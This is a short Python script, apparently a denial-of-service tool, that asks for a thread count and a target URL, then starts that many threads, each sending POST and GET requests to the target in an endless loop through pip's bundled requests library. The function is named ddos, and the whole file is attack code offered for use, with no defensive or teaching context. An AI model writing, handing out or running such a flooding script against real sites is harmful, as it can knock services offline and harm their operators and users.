from threading import Thread
import pip._vendor.requests as r

print("Strength: ")
thrnom = int(input())
print("\nUrl: ")
url = str(input())
                
def ddos():
    while(True):
        first = r.post(url)
        sec = r.get(url)

print("Ready..")

for i in range(thrnom):
    thr = Thread(target=ddos)
    thr.start()

print("World is changing...")